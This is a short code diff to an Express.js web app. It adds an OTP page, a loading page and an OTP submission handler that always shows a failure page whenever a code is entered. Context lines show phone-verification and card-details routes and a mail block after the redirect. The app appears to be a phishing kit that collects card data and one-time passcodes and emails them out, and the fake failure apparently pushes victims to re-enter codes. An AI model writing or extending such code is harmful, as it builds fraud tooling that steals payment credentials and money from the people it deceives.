@@ -33,6 +33,22 @@ app.get("/phone-verification", (req, res) => {
     res.render("mobilenumber")
 })
 
+app.get("/otp", (req, res) => {
+    res.render("otp.html")
+})
+
+app.get("/load", (req, res) => {
+    res.render("load.html")
+})
+
+app.post("/otp_post", (req, res) => {
+    if(req.body.otpValue) {
+        res.render("failed.html")
+    } else {
+        res.render("index.html")
+    }
+})
+
 app.post("/phone-verification", (req, res) => {
     res.redirect("/card-details")
     var mailOptions = {
